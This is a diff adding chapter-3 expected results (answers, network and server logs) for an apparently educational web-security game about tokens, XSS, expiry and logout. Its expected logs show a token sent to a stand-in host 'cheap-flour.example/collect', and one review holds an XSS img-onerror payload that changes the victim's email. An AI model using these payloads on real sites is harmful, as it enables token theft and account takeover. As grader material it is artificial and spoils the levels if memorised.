@@ -24,6 +24,10 @@ export interface ExpectedRun {
   refused?: string[]
   /** The names a script on the page can read once the run is over. */
   readable?: string[]
+  /** Chapter 3: the keys the page's own origin keeps once the run is over, 'local token' / 'session draft'. */
+  storage?: string[]
+  /** Chapter 3: the thief's requests from outside the browser the Server panel shows, 'METHOD address status', in order. */
+  replayed?: string[]
 }
 
 export interface ExpectedLevel {
@@ -330,6 +334,158 @@ export const expected: Record<string, ExpectedLevel> = {
       server: ['GET /pickup/1042 200'],
       sent: [`GET ${API}/pickup/1042 session`, `GET ${API}/pickup/1042 widget`, `GET ${API}/pickup/1042 lang`],
       stored: ['lang', 'prefs', 'session', 'widget']
+    }
+  },
+  // chapter 3: auth & tokens (the storage the page's origin keeps, and the thief's requests from outside the browser)
+  'web-11-token-in-storage': {
+    answers: ['anything'],
+    start: {
+      probes: { who: 'Signed in as Lena', own: 'Thanks! Your order is in.', taken: 200, still: 'Signed in as Lena', other: 401, lookalike: 401, anon: 'refused', stolen: 401 },
+      errors: 0,
+      network: [`POST ${API}/login 200`, `GET ${API}/account 200`, `OPTIONS ${API}/account 204`, `GET ${API}/orders 200`, `OPTIONS ${API}/orders 204`, 'GET https://cheap-flour.example/collect?s=%7B%22token%22%3A%22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsZW5hIiwiaWF0IjoxNzk0OTA4NDYwLCJleHAiOjE3OTQ5MTIwNjB9.o0kJVy6__1eQdV3OeTRbv9XEBJxgt1_PSaSK-OyLCYs%22%7D 200', `POST ${API}/orders 201`, `OPTIONS ${API}/orders 204`, `GET ${API}/orders 200`, `OPTIONS ${API}/orders 204`, 'GET https://cheap-flour.example/collect?s=%7B%22token%22%3A%22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsZW5hIiwiaWF0IjoxNzk0OTA4NDYwLCJleHAiOjE3OTQ5MTIwNjB9.o0kJVy6__1eQdV3OeTRbv9XEBJxgt1_PSaSK-OyLCYs%22%7D 200', `GET ${API}/account 200`, `OPTIONS ${API}/account 204`, `GET ${API}/orders 200`, `OPTIONS ${API}/orders 204`, `POST ${API}/orders 401`, `POST ${API}/orders 401`],
+      server: ['POST /login 200', 'OPTIONS /account 204', 'GET /account 200', 'OPTIONS /orders 204', 'GET /orders 200', 'GET /account 200', 'OPTIONS /orders 204', 'POST /orders 201', 'OPTIONS /orders 204', 'GET /orders 200', 'GET /account 401', 'GET /account 200', 'OPTIONS /account 204', 'GET /account 200', 'OPTIONS /orders 204', 'GET /orders 200', 'POST /orders 401', 'POST /orders 401', 'GET /orders 401', 'GET /account 401'],
+      asks: ['authorization', 'authorization', 'authorization', 'authorization', 'authorization', 'authorization'],
+      storage: ['local token'],
+      replayed: [`GET ${API}/account 200`]
+    },
+    solved: {
+      probes: { who: 'Signed in as Lena', own: 'Thanks! Your order is in.', taken: 401, still: 'Signed in as Lena', other: 401, lookalike: 401, anon: 'refused', stolen: 401 },
+      errors: 0,
+      network: [`POST ${API}/login 200`, `GET ${API}/account 200`, `GET ${API}/orders 200`, 'GET https://cheap-flour.example/collect?s=%7B%7D 200', `POST ${API}/orders 201`, `GET ${API}/orders 200`, 'GET https://cheap-flour.example/collect?s=%7B%7D 200', `GET ${API}/account 200`, `GET ${API}/orders 200`, `POST ${API}/orders 401`, `POST ${API}/orders 401`],
+      server: ['POST /login 200', 'GET /account 200', 'GET /orders 200', 'GET /account 401', 'POST /orders 201', 'GET /orders 200', 'GET /account 401', 'GET /account 401', 'GET /account 401', 'GET /account 401', 'GET /account?s=%7B%7D 401', 'GET /account 200', 'GET /orders 200', 'POST /orders 401', 'POST /orders 401', 'GET /orders 401', 'GET /account 401'],
+      sent: [`GET ${API}/account session`, `GET ${API}/orders session`, `POST ${API}/orders session`, `GET ${API}/orders session`, `GET ${API}/account session`, `GET ${API}/orders session`],
+      stored: ['session'],
+      replayed: [`GET ${API}/account 401`]
+    }
+  },
+  'web-practice-script-reads': {
+    answers: [['basket', 'step', 'theme']],
+    start: {
+      probes: {},
+      errors: 0,
+      network: [],
+      server: [],
+      stored: ['session', 'theme'],
+      readable: ['theme'],
+      storage: ['local basket', 'session checkout-step']
+    }
+  },
+  'web-12-review-runs': {
+    answers: ['changed'],
+    start: {
+      probes: { who: 'Signed in as Lena', mallory: '“Lovely crust! ” · Mallory', email: 1, guarded: 4, sam: '“Five stars from me” · Sam', jo: '“Nice rye & alert(1) soft inside” · Jo', elements: 3, emailAfter: 2, anon: 'refused', stolen: 401 },
+      errors: 3,
+      network: [`POST ${API}/login 200`, `GET ${API}/account 200`, `GET ${API}/orders 200`, `GET ${API}/reviews 200`, `POST ${API}/account/email 200`, `GET ${API}/reviews 200`, `POST ${API}/account/email 200`],
+      server: ['POST /login 200', 'GET /account 200', 'GET /orders 200', 'GET /reviews 200', 'POST /account/email 200', 'POST /reviews 201', 'POST /reviews 201', 'GET /reviews 200', 'POST /account/email 200', 'GET /orders 401', 'GET /account 401'],
+      sent: [`GET ${API}/account session`, `GET ${API}/orders session`, `POST ${API}/account/email session`, `POST ${API}/account/email session`],
+      stored: ['session']
+    },
+    solved: {
+      probes: { who: 'Signed in as Lena', mallory: `“Lovely crust! <img src="x" onerror="fetch('${API}/account/email', { method: 'POST', credentials: 'include', body: new URLSearchParams('email=mallory@cheap-flour.example') })">” · Mallory`, email: 0, guarded: 4, sam: '“Five stars <IMG SRC=x ONERROR=this.remove()> from me” · Sam', jo: '“Nice <b onmouseover = "this.remove()">rye</b> & <script>alert(1)</script> soft inside” · Jo', elements: 0, emailAfter: 0, anon: 'refused', stolen: 401 },
+      errors: 0,
+      network: [`POST ${API}/login 200`, `GET ${API}/account 200`, `GET ${API}/orders 200`, `GET ${API}/reviews 200`, `GET ${API}/reviews 200`],
+      server: ['POST /login 200', 'GET /account 200', 'GET /orders 200', 'GET /reviews 200', 'POST /reviews 201', 'POST /reviews 201', 'GET /reviews 200', 'GET /orders 401', 'GET /account 401'],
+      sent: [`GET ${API}/account session`, `GET ${API}/orders session`],
+      stored: ['session']
+    }
+  },
+  'web-practice-which-run': {
+    answers: [['img', 'adjacent']],
+    start: {
+      probes: {},
+      errors: 2,
+      network: ['GET https://cheap-flour.example/ran?case=img 200', 'GET https://cheap-flour.example/ran?case=adjacent 200'],
+      server: []
+    }
+  },
+  'web-13-token-never-expires': {
+    answers: ['ok'],
+    start: {
+      probes: { away: 'Not signed in: please sign in again.', har: 200, forged: 401, again: 'Signed in as Lena', harAgain: 200, own: 'Thanks! Your order is in.', anon: 'refused', stolen: 401 },
+      errors: 1,
+      network: [`POST ${API}/login 200`, `GET ${API}/account 200`, `GET ${API}/orders 200`, `GET ${API}/account 401`, `POST ${API}/login 200`, `GET ${API}/account 200`, `GET ${API}/orders 200`, `POST ${API}/orders 201`, `GET ${API}/orders 200`],
+      server: ['POST /login 200', 'GET /account 200', 'GET /orders 200', 'GET /account 200', 'GET /account 401', 'GET /account 200', 'POST /login 200', 'GET /account 401', 'GET /account 401', 'GET /account 401', 'GET /account 401', 'POST /login 200', 'GET /account 200', 'GET /orders 200', 'GET /account 200', 'POST /orders 201', 'GET /orders 200', 'GET /orders 401', 'GET /account 401'],
+      sent: [`GET ${API}/account session`, `GET ${API}/orders session`, `GET ${API}/account session`, `GET ${API}/orders session`, `POST ${API}/orders session`, `GET ${API}/orders session`],
+      stored: ['session'],
+      replayed: [`GET ${API}/account 200`]
+    },
+    solved: {
+      probes: { away: 'Not signed in: please sign in again.', har: 401, forged: 401, again: 'Signed in as Lena', harAgain: 401, own: 'Thanks! Your order is in.', anon: 'refused', stolen: 401 },
+      errors: 1,
+      network: [`POST ${API}/login 200`, `GET ${API}/account 200`, `GET ${API}/orders 200`, `GET ${API}/account 401`, `POST ${API}/login 200`, `GET ${API}/account 200`, `GET ${API}/orders 200`, `POST ${API}/orders 201`, `GET ${API}/orders 200`],
+      server: ['POST /login 200', 'GET /account 200', 'GET /orders 200', 'GET /account 401', 'GET /account 401', 'GET /account 401', 'POST /login 200', 'GET /account 401', 'GET /account 401', 'GET /account 401', 'GET /account 401', 'POST /login 200', 'GET /account 200', 'GET /orders 200', 'GET /account 401', 'POST /orders 201', 'GET /orders 200', 'GET /orders 401', 'GET /account 401'],
+      sent: [`GET ${API}/account session`, `GET ${API}/orders session`, `GET ${API}/account session`, `GET ${API}/orders session`, `POST ${API}/orders session`, `GET ${API}/orders session`],
+      stored: ['session'],
+      replayed: [`GET ${API}/account 401`]
+    }
+  },
+  'web-practice-which-tokens': {
+    answers: [['valid', 'forever']],
+    start: {
+      probes: {},
+      errors: 3,
+      network: [`GET ${API}/check/valid 200`, `GET ${API}/check/expired 401`, `GET ${API}/check/forever 200`, `GET ${API}/check/edited 401`, `GET ${API}/check/none 401`],
+      server: ['GET /check/valid 200', 'GET /check/expired 401', 'GET /check/forever 200', 'GET /check/edited 401', 'GET /check/none 401']
+    }
+  },
+  'web-14-signed-out-again': {
+    answers: [['order']],
+    start: {
+      probes: { order: 'Sorry, your order did not go through.', refreshes: 0, who: 'Not signed in: please sign in again.', idle: 0, old: 401, anon: 'refused', stolen: 401, month: 'Sorry, your order did not go through.', gaveUp: 0 },
+      errors: 5,
+      network: [`POST ${API}/login 200`, `GET ${API}/account 200`, `GET ${API}/orders 200`, `POST ${API}/orders 401`, `GET ${API}/orders 401`, `GET ${API}/account 401`, `POST ${API}/orders 401`, `GET ${API}/orders 401`],
+      server: ['POST /login 200', 'GET /account 200', 'GET /orders 200', 'POST /orders 401', 'GET /orders 401', 'GET /account 401', 'POST /login 200', 'GET /account 401', 'GET /orders 401', 'GET /account 401', 'POST /orders 401', 'GET /orders 401'],
+      sent: [`GET ${API}/account session`, `GET ${API}/orders session`]
+    },
+    solved: {
+      probes: { order: 'Thanks! Your order is in.', refreshes: 1, who: 'Signed in as Lena', idle: 1, old: 401, anon: 'refused', stolen: 401, month: 'Sorry, your order did not go through.', gaveUp: 3 },
+      errors: 5,
+      network: [`POST ${API}/login 200`, `GET ${API}/account 200`, `GET ${API}/orders 200`, `POST ${API}/orders 401`, `POST ${API}/auth/refresh 204`, `POST ${API}/orders 201`, `GET ${API}/orders 200`, `GET ${API}/account 200`, `GET ${API}/orders 200`, `POST ${API}/orders 401`, `POST ${API}/auth/refresh 401`, `GET ${API}/orders 401`, `POST ${API}/auth/refresh 401`],
+      server: ['POST /login 200', 'GET /account 200', 'GET /orders 200', 'POST /orders 401', 'POST /auth/refresh 204', 'POST /orders 201', 'GET /orders 200', 'GET /account 200', 'GET /orders 200', 'POST /login 200', 'GET /account 401', 'GET /orders 401', 'GET /account 401', 'POST /orders 401', 'POST /auth/refresh 401', 'GET /orders 401', 'POST /auth/refresh 401'],
+      sent: [`GET ${API}/account session`, `GET ${API}/orders session`, `POST ${API}/auth/refresh refresh`, `POST ${API}/orders session`, `GET ${API}/orders session`, `GET ${API}/account session`, `GET ${API}/orders session`]
+    }
+  },
+  'web-practice-refresh-cookie': {
+    answers: [['refresh', 'logout']],
+    start: {
+      probes: {},
+      errors: 0,
+      network: [`GET ${API}/account 200`, `POST ${API}/orders 201`, `POST ${API}/auth/refresh 204`, `POST ${API}/auth/logout 204`, `GET ${API}/authors 200`],
+      server: ['GET /account 200', 'POST /orders 201', 'POST /auth/refresh 204', 'POST /auth/logout 204', 'GET /authors 200'],
+      sent: [`GET ${API}/account session`, `POST ${API}/orders session`, `POST ${API}/auth/refresh refresh`, `POST ${API}/auth/refresh session`, `POST ${API}/auth/logout refresh`, `POST ${API}/auth/logout session`, `GET ${API}/authors session`],
+      stored: ['session', 'refresh']
+    }
+  },
+  'web-15-logout-stays': {
+    answers: [['account', 'refresh']],
+    start: {
+      probes: { out: 'Signed out.', browser: 'Not signed in: please sign in again.', account: 200, refresh: 204, sam: 200, samRefresh: 204, again: 'Signed in as Lena', own: 'Thanks! Your order is in.', anon: 'refused', stolen: 401 },
+      errors: 2,
+      network: [`POST ${API}/login 200`, `GET ${API}/account 200`, `GET ${API}/orders 200`, `POST ${API}/auth/logout 204`, `GET ${API}/account 401`, `POST ${API}/auth/refresh 401`, `POST ${API}/login 200`, `GET ${API}/account 200`, `GET ${API}/orders 200`, `POST ${API}/orders 201`, `GET ${API}/orders 200`],
+      server: ['POST /login 200', 'POST /login 200', 'GET /account 200', 'GET /orders 200', 'POST /auth/logout 204', 'GET /account 200', 'POST /auth/refresh 204', 'GET /account 401', 'POST /auth/refresh 401', 'GET /account 200', 'POST /auth/refresh 204', 'GET /account 200', 'POST /auth/refresh 204', 'POST /login 200', 'GET /account 200', 'GET /orders 200', 'POST /orders 201', 'GET /orders 200', 'GET /orders 401', 'GET /account 401'],
+      sent: [`GET ${API}/account session`, `GET ${API}/orders session`, `POST ${API}/auth/logout refresh`, `POST ${API}/auth/logout session`, `GET ${API}/account session`, `GET ${API}/orders session`, `POST ${API}/orders session`, `GET ${API}/orders session`],
+      stored: ['session', 'refresh'],
+      replayed: [`GET ${API}/account 200`, `POST ${API}/auth/refresh 204`]
+    },
+    solved: {
+      probes: { out: 'Signed out.', browser: 'Not signed in: please sign in again.', account: 401, refresh: 401, sam: 200, samRefresh: 204, again: 'Signed in as Lena', own: 'Thanks! Your order is in.', anon: 'refused', stolen: 401 },
+      errors: 2,
+      network: [`POST ${API}/login 200`, `GET ${API}/account 200`, `GET ${API}/orders 200`, `POST ${API}/auth/logout 204`, `GET ${API}/account 401`, `POST ${API}/auth/refresh 401`, `POST ${API}/login 200`, `GET ${API}/account 200`, `GET ${API}/orders 200`, `POST ${API}/orders 201`, `GET ${API}/orders 200`],
+      server: ['POST /login 200', 'POST /login 200', 'GET /account 200', 'GET /orders 200', 'POST /auth/logout 204', 'GET /account 401', 'POST /auth/refresh 401', 'GET /account 401', 'POST /auth/refresh 401', 'GET /account 401', 'POST /auth/refresh 401', 'GET /account 200', 'POST /auth/refresh 204', 'POST /login 200', 'GET /account 200', 'GET /orders 200', 'POST /orders 201', 'GET /orders 200', 'GET /orders 401', 'GET /account 401'],
+      sent: [`GET ${API}/account session`, `GET ${API}/orders session`, `POST ${API}/auth/logout refresh`, `POST ${API}/auth/logout session`, `GET ${API}/account session`, `GET ${API}/orders session`, `POST ${API}/orders session`, `GET ${API}/orders session`],
+      stored: ['session', 'refresh'],
+      replayed: [`GET ${API}/account 401`, `POST ${API}/auth/refresh 401`]
+    }
+  },
+  'web-practice-after-logout': {
+    answers: [['now']],
+    start: {
+      probes: {},
+      errors: 0,
+      network: [`POST ${API}/login 200`, `GET ${API}/account 200`, `GET ${API}/orders 200`, `POST ${API}/auth/logout 204`],
+      server: ['POST /login 200', 'GET /account 200', 'GET /orders 200', 'POST /auth/logout 204', 'GET /account 200', 'POST /auth/refresh 401', 'GET /orders 401'],
+      sent: [`GET ${API}/account session`, `GET ${API}/orders session`, `POST ${API}/auth/logout refresh`, `POST ${API}/auth/logout session`],
+      replayed: [`GET ${API}/account 200`, `POST ${API}/auth/refresh 401`, `GET ${API}/orders 401`]
     }
   }
 }
